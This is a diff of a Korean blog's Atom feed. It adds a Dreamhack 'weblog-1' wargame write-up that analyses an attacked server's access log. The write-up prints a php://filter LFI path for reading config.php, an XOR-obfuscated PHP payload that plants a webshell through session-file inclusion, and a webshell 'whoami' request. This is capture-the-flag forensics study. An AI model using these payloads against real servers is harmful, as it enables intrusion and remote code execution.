@@ -1,5 +1,113 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-08-29T15:18:08+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<pre><code class="language-mermaild!">sequenceDiagram
-</code></pre>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[오직 로컬에서만 되냐 젠장]]></summary></entry><entry><title type="html">[wargame.kr] PHP LFI 문제</title><link href="http://localhost:4000/dreamhack/php_LFI_vuln/" rel="alternate" type="text/html" title="[wargame.kr] PHP LFI 문제" /><published>2023-08-29T00:00:00+09:00</published><updated>2023-08-29T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php_LFI_vuln</id><content type="html" xml:base="http://localhost:4000/dreamhack/php_LFI_vuln/"><![CDATA[<h2 id="lfi--php-wrapper">LFI + PHP Wrapper</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-09-10T17:47:23+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<pre><code class="language-mermaild!">sequenceDiagram
+</code></pre>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[오직 로컬에서만 되냐 젠장]]></summary></entry><entry><title type="html">[wargame.kr] weblog-1 문제</title><link href="http://localhost:4000/dreamhack/weblog-1_log%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0/" rel="alternate" type="text/html" title="[wargame.kr] weblog-1 문제" /><published>2023-09-10T00:00:00+09:00</published><updated>2023-09-10T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/weblog-1_log%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0</id><content type="html" xml:base="http://localhost:4000/dreamhack/weblog-1_log%ED%99%95%EC%9D%B8%ED%95%98%EA%B8%B0/"><![CDATA[<h2 id="문제">문제</h2>
+<ul>
+  <li><a href="https://dreamhack.io/wargame/challenges/71">weblog-1 문제</a></li>
+</ul>
+
+<h2 id="level-0">LEVEL 0</h2>
+<ul>
+  <li>log 의 기록을 보고 admin 계정을 비밀번호를 찾아주면 된다.</li>
+  <li>로그 분석 결과 500 에러(서버 에러)가 발생할 때 나오는 비교 정수 값을 char 로 변환해주면 된다.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">'./file/access.log'</span><span class="p">)</span>
+<span class="n">keyword</span> <span class="o">=</span> <span class="s">'HTTP/1.1" 500'</span>
+<span class="n">keyword2</span> <span class="o">=</span> <span class="s">'))='</span>
+
+<span class="n">arr</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">line</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readline</span><span class="p">()</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="s">'end'</span><span class="p">)</span>
+        <span class="k">break</span>
+    
+    <span class="k">if</span> <span class="n">keyword</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
+        <span class="k">continue</span>
+
+    <span class="n">a</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="n">keyword2</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="n">a</span><span class="o">+</span><span class="nf">len</span><span class="p">(</span><span class="n">keyword2</span><span class="p">):]</span>
+
+    <span class="n">l</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="s">','</span><span class="p">)</span>
+
+    <span class="n">arr</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">line</span><span class="p">[:</span><span class="n">l</span><span class="p">])))</span>
+    <span class="c1"># print(line[:l])
+</span>    
+<span class="nf">print</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">arr</span><span class="p">))</span>
+
+<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="level-1">LEVEL 1</h2>
+<ul>
+  <li>config.php 파일을 추출해야 한다.</li>
+  <li>include 를 이용하여 파일을 추출하는 것을 확인할 수 있다.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/admin/?page=php://filter/convert.base64-encode/resource=../config.php
+</code></pre></div></div>
+
+<h2 id="level-2">LEVEL 2</h2>
+<ul>
+  <li>
+    <p>LFI(Local File Include) 취약점을 이용하여 서버의 php 코드를 실행하는 것을 확인할 수 있다.</p>
+  </li>
+  <li>
+    <p>악성 php 코드 저장</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.17.0.1 - - [02/Jun/2020:09:55:16 +0000] "GET /admin/?page=memo.php&amp;memo=%3C?php%20function%20m($l,$T=0){$K=date(%27Y-m-d%27);$_=strlen($l);$__=strlen($K);for($i=0;$i%3C$_;$i%2b%2b){for($j=0;$j%3C$__;%20$j%2b%2b){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return%20$l;}%20m(%27bmha[tqp[gkjpajpw%27)(m(%27%2brev%2bsss%2blpih%2bqthke`w%2bmiecaw*tlt%27),m(%278;tlt$lae`av,%26LPPT%2b5*5$040$Jkp$Bkqj`%26-?w}wpai,%20[CAP_%26g%26Y-?%27));%20?%3E HTTP/1.1" 200 1098 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
+</code></pre></div></div>
+
+<ul>
+  <li>코드를 살펴본 결과 memo.php 에서 memo 파라미터로 들어오는 값을 session 에 저장하는 것을 확인할 수 있다.</li>
+  <li>session에 저장된 값을 불러오기 위해서 include 기능을 이용한 것을 확인할 수 있다.</li>
+  <li>악성 코드가 서버에서 실행된다!</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.17.0.1 - - [02/Jun/2020:09:55:39 +0000] "GET /admin/?page=/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732 HTTP/1.1" 200 735 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
+</code></pre></div></div>
+
+<h2 id="level-3">LEVEL 3</h2>
+<ul>
+  <li>웹 쉘 코드가 저장된 위치를 알아내야 한다.</li>
+  <li>level2 에서 실행시킨 코드이다.</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+<span class="k">function</span> <span class="n">m</span><span class="p">(</span><span class="nv">$l</span><span class="p">,</span><span class="nv">$T</span><span class="o">=</span><span class="mi">0</span><span class="p">){</span>
+	<span class="nv">$K</span><span class="o">=</span><span class="nb">date</span><span class="p">(</span><span class="s1">'Y-m-d'</span><span class="p">);</span>
+	<span class="nv">$_</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$l</span><span class="p">);</span>
+	<span class="nv">$__</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$K</span><span class="p">);</span>
+	<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$_</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+		<span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="nv">$__</span><span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
+			<span class="k">if</span><span class="p">(</span><span class="nv">$T</span><span class="p">){</span>
+				<span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">=</span><span class="nv">$K</span><span class="p">[</span><span class="nv">$j</span><span class="p">]</span><span class="o">^</span><span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
+			<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+				<span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">=</span><span class="nv">$l</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">^</span><span class="nv">$K</span><span class="p">[</span><span class="nv">$j</span><span class="p">];</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="nv">$l</span><span class="p">;</span>
+<span class="p">}</span> 
+<span class="nf">m</span><span class="p">(</span><span class="s1">'bmha[tqp[gkjpajpw'</span><span class="p">)(</span><span class="nf">m</span><span class="p">(</span><span class="s1">'+rev+sss+lpih+qthke`w+miecaw*tlt'</span><span class="p">),</span><span class="nf">m</span><span class="p">(</span><span class="s1">'8;tlt$lae`av,&amp;LPPT+5*5$040$Jkp$Bkqj`&amp;-?w}wpai, [CAP_&amp;g&amp;Y-?'</span><span class="p">));</span> 
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>난독화 되어있는 것을 확인할 수 있다.</li>
+  <li><code class="language-plaintext highlighter-rouge">date('Y-m-d')</code> 를 02/Jun/2020 즉 <code class="language-plaintext highlighter-rouge">2020-06-02</code> 로 바꾼 다음 php 로 실행시켜 주면 어떻게 웹 쉘 코드를 업로드 하였는지 출력되는 것을 확인할 수 있다.</li>
+</ul>
+
+<h2 id="level-4">LEVEL 4</h2>
+<ul>
+  <li>처음으로 실행된 명령어는 로그를 보면 바로 알 수 있다.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.17.0.1 - - [02/Jun/2020:09:56:32 +0000] "GET /uploads/images.php?c=whoami HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
+</code></pre></div></div>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="access.log" /><summary type="html"><![CDATA[weblog-1 문제 풀이]]></summary></entry><entry><title type="html">[wargame.kr] PHP LFI 문제</title><link href="http://localhost:4000/dreamhack/php_LFI_vuln/" rel="alternate" type="text/html" title="[wargame.kr] PHP LFI 문제" /><published>2023-08-29T00:00:00+09:00</published><updated>2023-08-29T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php_LFI_vuln</id><content type="html" xml:base="http://localhost:4000/dreamhack/php_LFI_vuln/"><![CDATA[<h2 id="lfi--php-wrapper">LFI + PHP Wrapper</h2>
 <ul>
   <li>include 취약점과 wrapper 취약점을 이용하여 문제를 해결해 주어야 한다.</li>
 </ul>
@@ -482,55 +590,4 @@ com.sun.jndi.cosnaming.object.trustURLCodebase=false
 <ul>
   <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">NVD - CVE-2021-44228 (nist.gov)</a></li>
   <li><a href="https://logging.apache.org/log4j/2.x/release-notes/2.16.0.html">Log4j – (apache.org)</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="java" /><category term="log4j" /><summary type="html"><![CDATA[Log4j가 무엇인지 정리하고, 직접 사용해 보았다.]]></summary></entry><entry><title type="html">IP주소와 MAC주소 간단한 정리</title><link href="http://localhost:4000/IPandMAC/" rel="alternate" type="text/html" title="IP주소와 MAC주소 간단한 정리" /><published>2023-07-28T00:00:00+09:00</published><updated>2023-07-28T23:13:00+09:00</updated><id>http://localhost:4000/IPandMAC</id><content type="html" xml:base="http://localhost:4000/IPandMAC/"><![CDATA[<h2 id="ip-주소">IP 주소</h2>
-<ul>
-  <li>Internet Protocol Address</li>
-  <li>컴퓨터 네트워크에서 장치들이 서로 인식하고 통신을 하기위해 사용하는 특수한 번호이다.</li>
-  <li>네트워크에서 장치들의 연결을 확인하기 위해 사용된다.</li>
-</ul>
-
-<h3 id="구조">구조</h3>
-<ul>
-  <li>IPv4 ( 4 byte ) : 192.168.1.1</li>
-  <li>IPv6 ( 16 byte ) :  FFFF:F200:3204:0B00</li>
-</ul>
-
-<h3 id="사용되는-위치">사용되는 위치</h3>
-<ul>
-  <li>네트워크 계층( 3 계층 )</li>
-</ul>
-
-<h3 id="통신할-때">통신할 때</h3>
-<ul>
-  <li>라우터는 데이터를 전달할 때 IP 주소가 필요하다.</li>
-</ul>
-
-<h2 id="mac-주소">MAC 주소</h2>
-<ul>
-  <li>Media Access Control Address</li>
-  <li>장치가 할당받은 오직 하나의 물리적 주소이다.</li>
-  <li>장치의 물리적 주소를 보장하기 위해 사용된다.</li>
-  <li>장치를 식별하는데 사용된다.</li>
-</ul>
-
-<h3 id="구조-1">구조</h3>
-<ul>
-  <li>6 byte 16진법 주소.</li>
-  <li>구조 예시 : 00:FF:FF:AB:BB:AA</li>
-</ul>
-
-<h3 id="사용되는-위치-1">사용되는 위치</h3>
-<ul>
-  <li>데이터 링크 계층( 2 계층 )</li>
-</ul>
-
-<h3 id="통신할-때-1">통신할 때</h3>
-<ul>
-  <li>스위치는 데이터를 전달할 때 MAC 주소를 필요로 한다.</li>
-</ul>
-
-<h2 id="참고-사이트">참고 사이트</h2>
-<ul>
-  <li><a href="https://www.geeksforgeeks.org/difference-between-mac-address-and-ip-address/">Difference between MAC Address and IP Address - GeeksforGeeks</a></li>
-  <li><a href="https://ko.wikipedia.org/wiki/IP_%EC%A3%BC%EC%86%8C">IP 주소 - 위키백과, 우리 모두의 백과사전 (wikipedia.org)</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="IP addr" /><category term="MAC addr" /><summary type="html"><![CDATA[IP주소와 MAC주소에 대하여 정리해보자.]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="java" /><category term="log4j" /><summary type="html"><![CDATA[Log4j가 무엇인지 정리하고, 직접 사용해 보았다.]]></summary></entry></feed>
